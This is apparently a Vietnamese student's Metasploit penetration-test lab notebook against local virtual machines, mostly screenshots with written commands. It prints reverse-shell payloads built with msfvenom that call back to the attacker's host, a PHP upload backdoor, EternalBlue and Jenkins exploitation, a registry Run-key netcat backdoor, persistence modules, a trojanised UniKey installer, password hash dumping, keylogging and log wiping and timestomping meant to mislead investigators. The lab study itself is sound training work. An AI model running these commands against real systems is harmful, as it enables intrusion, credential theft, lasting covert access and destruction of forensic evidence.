# MSF PENTEST REPORT

TOPOLOGY

Kali 192.168.44.128

me2 192.168.44.129

win  192.168.44.130

Ubu 192.168.44.132

RECON

![](../media/MSF%20PENTEST%20REPORT_1.png)

db_nmap -sS -sV -Pn -p- 192.168.44.129,130,132

![](../media/MSF%20PENTEST%20REPORT_2.png)

![](../media/MSF%20PENTEST%20REPORT_3.png)

ANALYZE SMB

![](../media/MSF%20PENTEST%20REPORT_4.png)

![](../media/MSF%20PENTEST%20REPORT_5.png)

set rhosts

![](../media/MSF%20PENTEST%20REPORT_6.png)

![](../media/MSF%20PENTEST%20REPORT_7.png)

Attack smb ms17

![](../media/MSF%20PENTEST%20REPORT_8.png)

Smb login:

![](../media/MSF%20PENTEST%20REPORT_9.png)

Bruteforce smb

![](../media/MSF%20PENTEST%20REPORT_10.png)

![](../media/MSF%20PENTEST%20REPORT_11.png)

Kết quả: vagrant: vagrant

MYSQL recon

![](../media/MSF%20PENTEST%20REPORT_12.png)

![](../media/MSF%20PENTEST%20REPORT_13.png)

Mysql version

![](../media/MSF%20PENTEST%20REPORT_14.png)

Mysql login

![](../media/MSF%20PENTEST%20REPORT_15.png)

Truy vấn DB

![](../media/MSF%20PENTEST%20REPORT_16.png)

![](../media/MSF%20PENTEST%20REPORT_17.png)

![](../media/MSF%20PENTEST%20REPORT_18.png)

![](../media/MSF%20PENTEST%20REPORT_19.png)

Authenticated Code Execution in Axis2 Business

Trên máy metas3 2k8 có chạy dịch vụ apache ( metas3 lỗi trên vmware không open port 8282 nên sẽ demo trên virtualbox)

![](../media/MSF%20PENTEST%20REPORT_20.png)

Sau khi quét được version thì search gg ra cve, sau đó search lại ở msf

![](../media/MSF%20PENTEST%20REPORT_21.png)

![](../media/MSF%20PENTEST%20REPORT_22.png)

FTP

![](../media/MSF%20PENTEST%20REPORT_23.png)

![](../media/MSF%20PENTEST%20REPORT_24.png)

![](../media/MSF%20PENTEST%20REPORT_25.png)

Đăng nhập ftp không cần password

![](../media/MSF%20PENTEST%20REPORT_26.png)

FTP BACKDOOR

![](../media/MSF%20PENTEST%20REPORT_27.png)

Post exploit  ftp - hashdump

![](../media/MSF%20PENTEST%20REPORT_28.png)

Evade firewall

![](../media/MSF%20PENTEST%20REPORT_29.png)

sudo msfvenom -p windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai -i 3 -f exe LHO= 192.168.44.128 LPORT=4447 -o eva.exe

ATTACK RMI JAVA

![](../media/MSF%20PENTEST%20REPORT_30.png)

Xem thêm thông tin

![](../media/MSF%20PENTEST%20REPORT_31.png)

![](../media/MSF%20PENTEST%20REPORT_32.png)

Exploit

![](../media/MSF%20PENTEST%20REPORT_33.png)

![](../media/MSF%20PENTEST%20REPORT_34.png)

Đẩy exploit vào stack

![](../media/MSF%20PENTEST%20REPORT_35.png)

Exploit rmi server

Web Crawler trong MSF – HTTP và cách upload safe BACKDOOR![](../media/MSF%20PENTEST%20REPORT_36.png)

![](../media/MSF%20PENTEST%20REPORT_37.png)

services -s http -O 2

![](../media/MSF%20PENTEST%20REPORT_38.png)

Set host, port in crawler

![](../media/MSF%20PENTEST%20REPORT_39.png)

Kích vào link uploads – 0 có file nào

![](../media/MSF%20PENTEST%20REPORT_40.png)

Tấn công http upload file

![](../media/MSF%20PENTEST%20REPORT_41.png)

Tạo và upload backdoor lên Server

![](../media/MSF%20PENTEST%20REPORT_42.png)

Enum ra được đường link uploads file

![](../media/MSF%20PENTEST%20REPORT_43.png)

SNMP ENUM

![](../media/MSF%20PENTEST%20REPORT_44.png)

TẠO PHP UPLOAD BACKDOOR

msfvenom -p php/meterpreter/reverse_tcp -f raw LHO= 192.168.44.128 LPORT=8585 -o nweb.php

![](../media/MSF%20PENTEST%20REPORT_45.png)

Khai thác

![](../media/MSF%20PENTEST%20REPORT_46.png)

1 cách khác để upload file

curl -T "/home/kali/Desktop/newweb.php"

![](../media/MSF%20PENTEST%20REPORT_47.png)

Vào link kiểm tra

![](../media/MSF%20PENTEST%20REPORT_48.png)

Kiếm payload reverse shell

![](../media/MSF%20PENTEST%20REPORT_49.png)

Chạy payload và kích vào file vừa mới upload để lấy reverse shell

![](../media/MSF%20PENTEST%20REPORT_50.png)

SMTP Recon

![](../media/MSF%20PENTEST%20REPORT_51.png)

KHAI THÁC

Eternal blue

![](../media/MSF%20PENTEST%20REPORT_52.png)

Set rhost and payload

![](../media/MSF%20PENTEST%20REPORT_53.png)

Reverseshell – lang nghe port tren may nan nhan va may nan nhan se gui ve may tan cong

![](../media/MSF%20PENTEST%20REPORT_54.png)

![](../media/MSF%20PENTEST%20REPORT_55.png)

EXPLOIT JENKIN

Mở msfconsole và dùng lệnh: Services -s http

![](../media/MSF%20PENTEST%20REPORT_56.png)

truy cập ip:port

dùng lệnh

def sout = new StringBuilder(), serr = new StringBuilder()

def proc = ‘ipconfig'.execute()

proc.consumeProcessOutput(sout, serr)

proc.waitForOrKill(1000)

println "out> $sout\nerr> $serr"

![](../media/MSF%20PENTEST%20REPORT_57.png)

Exploit Jenkins với msf

Set rhosts,rport, target uri

![](../media/MSF%20PENTEST%20REPORT_58.png)

Bruteforce ports

![](../media/MSF%20PENTEST%20REPORT_59.png)

Tao file

msfvenom -p windows/meterpreter/reverse_tcp_allports  LHO=192.168.44.128  -f exe --platform windows -o  eva.exe

![](../media/MSF%20PENTEST%20REPORT_60.png)

![](../media/MSF%20PENTEST%20REPORT_61.png)

![](../media/MSF%20PENTEST%20REPORT_62.png)

![](../media/MSF%20PENTEST%20REPORT_63.png)

Dùng Script tự động tấn công kiểm định System

Dùng lệnh makerc /home/kali/Desktop/scan-ms17.rc để lưu lại các command đã dung trên msf

![](../media/MSF%20PENTEST%20REPORT_64.png)

Dùng lệnh resource /home/kali/Desktop/scan-ms17.rc để chạy tự động

![](../media/MSF%20PENTEST%20REPORT_65.png)

TẤN CÔNG đi sâu vào Advanced Privilege Escalation Memory

Khai thác lỗi eternal blue

![](../media/MSF%20PENTEST%20REPORT_66.png)

Đã thành công nhưng chưa chiếm full quyền

![](../media/MSF%20PENTEST%20REPORT_67.png)

Gõ ps để xem các process, dùng migrate pid explorer.exe nhưng 0 thành công

![](../media/MSF%20PENTEST%20REPORT_68.png)

Sau khi dùng các payload post exploit 0 thành công thì down sysret về.

sau đó, upload file lên máy window. Rồi migrate

![](../media/MSF%20PENTEST%20REPORT_69.png)

Sau khi chiếm full quyền thì có thể dung các lệnh như hình dưới

![](../media/MSF%20PENTEST%20REPORT_70.png)

Dùng module hashdump để lấy hash password của các acc trong win

![](../media/MSF%20PENTEST%20REPORT_71.png)

Sau khi dump password thì dung john để crack hash.

![](../media/MSF%20PENTEST%20REPORT_72.png)

Một số tài khoản sau khi lấy được pass

![](../media/MSF%20PENTEST%20REPORT_73.png)

Dùng MSF Mạo Danh Token chiếm quyền Administrator System

Load incognito để load các msf  Mạo Danh Token. Sau đó list token để  xem các token của user. Delegation tokens: token được quỷ quyền

Imersonation tokens: sinh ra để mạo danh thông qua ssh, rdp,..

![](../media/MSF%20PENTEST%20REPORT_74.png)

Thực hiện mạo danh token

![](../media/MSF%20PENTEST%20REPORT_75.png)

Chụp màn hình

![](../media/MSF%20PENTEST%20REPORT_76.png)

Bí mật Remote Desktop User trên Server mà không bị log out

Dùng lệnh run getgui -u <user>  -p <pass>

Lệnh này sẽ tạo user mới add vào trong hệ thống để rdp mà 0 chiếm sessions của user hiện tại

![](../media/MSF%20PENTEST%20REPORT_77.png)

rdesktop -u hiep -p 1234 192.168.44.132

![](../media/MSF%20PENTEST%20REPORT_78.png)

Search Critical Analyze – info SRV – download phân tích

run  post/windows/gather/enum_files FILE_GLOBS=*tomcat*.xml SEARCH_FROM=C:\\

module này sẽ kiếm các file liên quan tới tomcat xml từ ổ C và tự động download về máy

![](../media/MSF%20PENTEST%20REPORT_79.png)

Áp dụng WIRESHARK cùng MSF tấn công theo thời gian thực

Migrate leo thang rồi load module sniffer

![](../media/MSF%20PENTEST%20REPORT_80.png)

Xem interface, capture

![](../media/MSF%20PENTEST%20REPORT_81.png)

Nhập thông tin đăng nhập ở máy mục tiêu

![](../media/MSF%20PENTEST%20REPORT_82.png)

Tắt sniff và lưu file

![](../media/MSF%20PENTEST%20REPORT_83.png)

Bật wireshark thì capture được thông tin đăng nhập

![](../media/MSF%20PENTEST%20REPORT_84.png)

Dùng Port Forwarding khai thác thông tin System

![](../media/MSF%20PENTEST%20REPORT_85.png)![](../media/MSF%20PENTEST%20REPORT_86.png)

TẤN CÔNG Registry để giữ kết nối vĩnh viễn sau khi thâm nhập system

![](../media/MSF%20PENTEST%20REPORT_87.png)

Up backdoor vào máy bị tấn công

upload /home/kali/Desktop/nc.exe C:\\Windows\\System32

![](../media/MSF%20PENTEST%20REPORT_88.png)

reg enumkey -k HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\

reg setval -k HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\ -v backdoor -d 'C:\\Windows\System32\nc.exe -Ldp 4449 -e cmd.exe'

reg queryval -k HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\ -v backdoor

![](../media/MSF%20PENTEST%20REPORT_89.png)

Cách này không hoạt động khi hệ thống đã vá lỗi

Key logging trong MSF

![](../media/MSF%20PENTEST%20REPORT_90.png)

![](../media/MSF%20PENTEST%20REPORT_91.png)

TẤN CÔNG và giữ kết nối vĩnh viễn với Advanced Meterpreter Wormhole

Cách tấn công này giúp tạo 1 process tự động chạy trên máy mục tiêu, giúp vẫn truy cập được hệ thống khi hệ thống đã vá lỗi

run persistence -X -p 442 -i 5 -r  192.168.44.128

-X : tạo agent trên máy mục tiêu

-i: thời gian

-r: nhập ip máy kali tấn công

![](../media/MSF%20PENTEST%20REPORT_92.png)

![](../media/MSF%20PENTEST%20REPORT_93.png)

msfvenom -p windows/meterpreter/reverse_tcp  LHOST=192.168.44.128  LPORT=442 -f exe -a x86 --platform windows -o  persis.exe

![](../media/MSF%20PENTEST%20REPORT_94.png)

use exploit/multi/handler

set payload windows/meterpreter/reverse_tcp

set LHOST 192.168.44.128

set LPORT 442

exploit

![](../media/MSF%20PENTEST%20REPORT_95.png)

Tạo persistence bằng meterpreter

run post/windows/manage/persistence_exe REXENAME=persis.exe REXEPATH=/home/kali/persis.exe STARTUP=SYSTEM

bg

options

exploit

Sau khi tạo persistence thì dù khởi động lại exploit thì vẫn có thể kết nối lại bằng nc hoặc qua module:  exploit/multi/handler

![](../media/MSF%20PENTEST%20REPORT_96.png)

PERSISTENCE PART 2:

![](../media/MSF%20PENTEST%20REPORT_97.png)

![](../media/MSF%20PENTEST%20REPORT_98.png)

Set exploit multi hander để tạo lisenter – tương tự nc

![](../media/MSF%20PENTEST%20REPORT_99.png)

Đóng gói Virus vào trong Software Hợp Pháp để tạo kết nối vĩnh viễn

Tạo file malware tích hợp vào trong 1 phần mềm bình thường:

msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.44.128 LPORT=445 --platform windows -a x86 -f exe -x /home/kali/Desktop/UniKeyNT.exe -k -o /home/kali/Desktop/1UniKeyNT.exe

![](../media/MSF%20PENTEST%20REPORT_100.png)

Sau đó dùng python để down về máy bị tấn công

Trên máy tấn công dung exploit/multi/handler để bắt lại quyền truy cập vào máy tấn công

Dùng câu lệnh:

set AutoRunScript 'post/windows/manage/migrate NAME=explorer.exe SPAWN=false'

để tự động chạy script khi session được khởi tạo.

![](../media/MSF%20PENTEST%20REPORT_101.png)

Sau đó chạy file exe trong máy bị tấn công. Và đợi session được mở.

![](../media/MSF%20PENTEST%20REPORT_102.png)

XÓA DẤU VẾT chứng cứ sau khi TẤN CÔNG HỢP PHÁP

Dùng 2 lệnh sau để xóa window event log được sinh ra trong lúc tấn công:

Clearev

run event_manager -c

![](../media/MSF%20PENTEST%20REPORT_103.png)

Chỉnh sửa chứng cứ để qua mặt Security Analyst điều tra

Xem metadata của file:

timestomp  c:\\wamp\\www\\testmysql.php -v

Đè metadata của file khác vào file mình cần che dấu:

timestomp  c:\\wamp\\www\\testmysql.php -f  c:\\wamp\\www\\meterpreter.php

![](../media/MSF%20PENTEST%20REPORT_104.png)

Thay đổi từng metadata:

timestomp  c:\\wamp\\www\\testmysql.php -a "12/16/2020 12:00:17"

tương tự  -m,-e, -c để thay đổi các phần còn lại

![](../media/MSF%20PENTEST%20REPORT_105.png)

SMB ENUM

![](../media/MSF%20PENTEST%20REPORT_106.png)

SCAN SERVICE:![](../media/MSF%20PENTEST%20REPORT_107.png)

SCAN HDH CỦA MÁY CLIENT:

nmap --script smb-os-discovery.nse -sV 10.50.150.158

![](../media/MSF%20PENTEST%20REPORT_108.png)

Enum user thông qua rid: enum4linux -r 10.50.150.158

![](../media/MSF%20PENTEST%20REPORT_109.png)

get password policy information: enum4linux -P 10.50.150.158 ![](../media/MSF%20PENTEST%20REPORT_110.png)

Get user list and detail:  enum4linux -U -d 10.50.150.158

![](../media/MSF%20PENTEST%20REPORT_111.png)

Từ cái này thấy được tài khoản 0 bị khóa, pass 0 hết hạn, có thể bruteforce được

Get share list: enum4linux -r 10.50.150.158

![](../media/MSF%20PENTEST%20REPORT_112.png)

Ở đây share Josephine đáng chú ý. Có thể có khả năng truy cập 0 cần mk

Dùng smbmap để xem quyền : smbmap -H 10.50.150.158

![](../media/MSF%20PENTEST%20REPORT_113.png)

Giờ chúng ta có thể xem được quyền smb. Có thể crack acc smb bằng:

crackmapexec smb 10.50.150.158   --shares -u ‘’ -p ‘’

![](../media/MSF%20PENTEST%20REPORT_114.png)

Truy cập vào thư mục được share: smbclient //10.50.150.158/osephine

![](../media/MSF%20PENTEST%20REPORT_115.png)

Sau đó get file về

![](../media/MSF%20PENTEST%20REPORT_116.png)

Tài khoản này có thể là tk ssh:

![](../media/MSF%20PENTEST%20REPORT_117.png)

Sau đó, tải linpeas về máy tấn công

![](../media/MSF%20PENTEST%20REPORT_118.png)

Rồi tạo web server: python -m SimpleHTTPServer

![](../media/MSF%20PENTEST%20REPORT_119.png)

Bên máy ssh thì rồi wget tải linpeas từ máy tấn công về rồi chạy.

![](../media/MSF%20PENTEST%20REPORT_120.png)

Tìm thấy được khá nhiều thứ có thể khai thác

![](../media/MSF%20PENTEST%20REPORT_121.png)

Bài này dễ nên sẽ dùng cách đơn giản hơn

![](../media/MSF%20PENTEST%20REPORT_122.png)

Có tài khoản root

![](../media/MSF%20PENTEST%20REPORT_123.png)

Lên quyền root

![](../media/MSF%20PENTEST%20REPORT_124.png)

PIVOTING

![](../media/MSF%20PENTEST%20REPORT_125.png)

Sau khi biết có vcms thì search trên msf

![](../media/MSF%20PENTEST%20REPORT_126.png)

Leo thang nếu chiếm quyền thấp

![](../media/MSF%20PENTEST%20REPORT_127.png)

![](../media/MSF%20PENTEST%20REPORT_128.png)

![](../media/MSF%20PENTEST%20REPORT_129.png)

Xem ip

![](../media/MSF%20PENTEST%20REPORT_130.png)

Autoroute

![](../media/MSF%20PENTEST%20REPORT_131.png)

Tiến hành scan các port trên network mới

![](../media/MSF%20PENTEST%20REPORT_132.png)

Tạo portfw

![](../media/MSF%20PENTEST%20REPORT_133.png)

Scan service vào khai khác

![](../media/MSF%20PENTEST%20REPORT_134.png)

TẠO SHELL VỚI MSFVENOM

![](../media/MSF%20PENTEST%20REPORT_135.png)

VỀ REVERSE_TCP LÀ STAGED PAYLOAD. VÌ VẬY CẦN THÊM 1 LISTENER RIÊNG.  Tham khảo hình dưới

![](../media/MSF%20PENTEST%20REPORT_136.png)

Sau đó, chạy file backdoor vừa tạo để lấy reverse shell

![](../media/MSF%20PENTEST%20REPORT_137.png)

Stageless như hình dưới thì netcat có thể bắt được. còn staged thì nc không bắt được.

![](../media/MSF%20PENTEST%20REPORT_138.png)

